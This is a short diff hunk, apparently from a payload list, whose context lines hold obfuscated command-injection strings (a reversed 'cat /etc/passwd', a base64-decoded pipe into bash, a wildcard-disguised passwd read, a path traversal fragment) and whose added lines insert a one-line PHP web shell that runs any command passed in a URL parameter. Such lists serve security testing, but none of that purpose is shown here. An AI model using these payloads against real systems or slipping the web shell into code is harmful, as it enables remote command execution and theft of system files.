@@ -19,3 +19,5 @@ $(rev<<<'dwssap/cte/ tac')
 echo ... | base64 -d | bash
 /???/ca? /e*/p*wd
 ....//
+php:
+<?php system($_GET['cmd']); ?>
